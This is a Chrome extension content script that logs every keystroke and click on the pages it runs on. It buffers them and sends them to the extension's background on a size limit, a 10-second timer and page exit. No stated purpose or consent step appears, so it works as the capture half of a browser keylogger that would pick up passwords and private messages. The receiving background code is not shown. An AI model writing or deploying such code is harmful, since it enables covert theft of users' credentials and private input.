// content-script.js
(() => {
  'use strict';

  // stable namespace in the content-script's isolated world
  const NS = (self.__MY_NS__ = self.__MY_NS__ || {});

  // local state
  let buffer = '';
  const FLUSH_LIMIT = 200;            // flush immediately when this length is reached
  const PERIODIC_FLUSH_MS = 10_000;   // flush every 10 seconds if buffer is non-empty

  let intervalId = null;

  // expose your function as a property (not a block-scoped decl)
  NS.newfunc = function (key) {
    if (key === ' ') return '[SPACE]';
    if (key === 'Enter') return '[ENTER]';
    if (key === 'Tab') return '[TAB]';
    if (key === 'Escape') return '[ESC]';
    if (key.length > 1) return `[${key.toUpperCase()}]`;
    return key;
  };

  // safe sender for MV3 (avoids "Extension context invalidated")
  function safeSend(type, data) {
    try {
      if (!chrome?.runtime?.id || !chrome?.runtime?.sendMessage) return;
      chrome.runtime.sendMessage({ type, data });
    } catch (_) {
      // context may be gone — ignore
    }
  }

  function flushNow() {
    if (!buffer) return;
    // Uncomment for debugging:
    // console.log('Flushing buffer:', buffer);
    safeSend('log', buffer);
    buffer = '';
  }

  function appendToBuffer(chunk) {
    buffer += chunk;

    // immediate flush if we hit the size limit
    if (buffer.length >= FLUSH_LIMIT) {
      flushNow();
    }
  }

  document.addEventListener('keydown', (e) => {
    appendToBuffer(`[KEY:${NS.newfunc(e.key)}]`);
  });

  document.addEventListener('click', (e) => {
    const element = e.target.tagName;
    const id = e.target.id ? `#${e.target.id}` : '';

    let classes = '';
    if (typeof e.target.className === 'string') {
      classes = e.target.className
        ? `.${e.target.className.split(' ').join('.')}`
        : '';
    }

    appendToBuffer(`[CLICK:${element}${id}${classes}]`);
  });

  // periodic flush: every PERIODIC_FLUSH_MS, send whatever is in the buffer (if any)
  intervalId = setInterval(() => {
    if (!buffer) return;
    flushNow();
  }, PERIODIC_FLUSH_MS);

  // try to flush on navigation away; pagehide is the bfcache-safe replacement for unload
  addEventListener(
    'pagehide',
    () => {
      if (buffer) {
        flushNow();
      }
      if (intervalId !== null) {
        clearInterval(intervalId);
        intervalId = null;
      }
    },
    { once: true }
  );
})();
